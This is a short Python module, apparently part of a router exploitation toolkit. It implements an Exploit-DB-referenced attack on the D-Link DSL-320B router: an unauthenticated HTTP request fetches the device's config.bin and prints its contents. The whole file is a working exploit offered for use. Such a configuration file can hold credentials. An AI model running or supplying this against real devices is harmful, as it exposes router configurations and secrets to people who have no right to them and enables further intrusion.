import util
import urllib
from ..router_vuln import RouterVuln


class get_config_320b(RouterVuln):
    """Read the configuration file
       http://www.exploit-db.com/exploits/25251/
    """
    def __init__(self):
        self.router = 'DSL-320B'
        self.vuln   = 'Read Configuration File'
        super(get_config_320b, self).__init__()

    def run(self):
        util.Msg('Fetching config from %s...' % self.ip)
        url = 'http://%s/config.bin' % self.ip
        try:
            response = urllib.urlopen(url).read()
            util.Msg(response)
        except Exception, e:
            util.Error('Error: %s' % e)
